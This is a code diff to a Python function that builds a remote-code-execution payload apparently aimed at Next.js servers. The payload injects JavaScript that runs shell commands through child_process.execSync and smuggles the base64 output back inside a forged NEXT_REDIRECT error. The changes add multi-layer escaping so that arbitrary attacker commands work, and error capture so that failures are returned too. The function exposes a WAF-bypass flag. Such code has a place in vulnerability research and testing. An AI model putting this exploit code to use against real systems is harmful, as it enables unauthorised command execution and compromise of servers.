@@ -123,6 +123,15 @@ def build_rce_payload(windows: bool = False, waf_bypass: bool = False, waf_bypas
 
     if command:
         cmd = command
+        # Robust escaping for JSON -> JS -> Shell
+        # 1. Escape backslashes first (doubled for JS, doubled again for JSON) -> 4x
+        cmd = cmd.replace("\\", "\\\\\\\\")
+        # 2. Escape single quotes (escaped for JS, backslash escaped for JSON) -> \\'
+        cmd = cmd.replace("'", "\\\\'")
+        # 3. Escape double quotes (escaped for JSON) -> \\"
+        cmd = cmd.replace('"', '\\\\"')
+        # 4. Remove newlines
+        cmd = cmd.replace("\n", " ")
     elif windows:
         # PowerShell payload - escape double quotes for JSON
         cmd = 'powershell -c \\\"41*271\\\"'
@@ -131,8 +140,9 @@ def build_rce_payload(windows: bool = False, waf_bypass: bool = False, waf_bypas
         cmd = 'echo $((41*271))'
 
     prefix_payload = (
-        f"var res=process.mainModule.require('child_process').execSync('{cmd}')"
-        f".toString('base64');;throw Object.assign(new Error('NEXT_REDIRECT'),"
+        f"var res;try{{res=process.mainModule.require('child_process').execSync('{cmd}').toString('base64')}}"
+        f"catch(e){{res=Buffer.from(e.toString()).toString('base64')}};"
+        f"throw Object.assign(new Error('NEXT_REDIRECT'),"
         f"{{digest: `NEXT_REDIRECT;push;/login?a=${{res}};307;`}});"
     )
 
